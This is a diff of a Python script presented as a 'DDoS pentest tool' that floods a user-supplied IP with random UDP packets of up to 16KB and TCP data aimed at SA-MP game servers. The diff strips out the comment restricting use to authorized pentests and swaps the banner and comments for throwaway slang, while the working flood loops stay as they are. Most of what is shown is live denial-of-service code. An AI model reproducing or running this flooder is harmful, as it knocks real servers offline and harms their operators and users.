@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-# Brutal UDP/TCP Pentest Script by VatierSynth - SA-MP Validated
-# Gunakan hanya untuk pentest dengan izin!
+# ga urus
+# gatwu
 
 import random
 import socket
@@ -11,7 +11,7 @@ os.system("clear")
 print("""
 ╭──────────────────────────────────────────────╮
 │          VatierSynth DDoS Pentest Tool       │
-│           Brutal SA-MP Valid Edition         │
+│           Ap SA-MP GatauNjir Edition         │
 ╰──────────────────────────────────────────────╯
 """)
 ip = str(input("[VatierSynth] Target IP: "))
@@ -31,8 +31,8 @@ def run_udp():
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             addr = (ip, port)
-            for _ in range(times * 3):  # lebih brutal: 3x packets per loop
-                size = random.randint(1024, 16384)  # sampai 16KB!
+            for _ in range(times * 3):  
+                size = random.randint(1024, 16384)  
                 packet = random.choice(samp_packets + [random._urandom(size)])
                 s.sendto(packet, addr)
             print(f"{tag} [VatierSynth] Sent {times*3} UDP packets (1-16KB) to {ip}:{port}")
@@ -47,7 +47,7 @@ def run_tcp():
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             s.settimeout(3)
             s.connect((ip, port))
-            for _ in range(times * 2):  # lebih brutal: 2x packets per loop
+            for _ in range(times * 2):  
                 size = random.randint(1024, 8192)
                 data = random._urandom(size)
                 s.send(data)
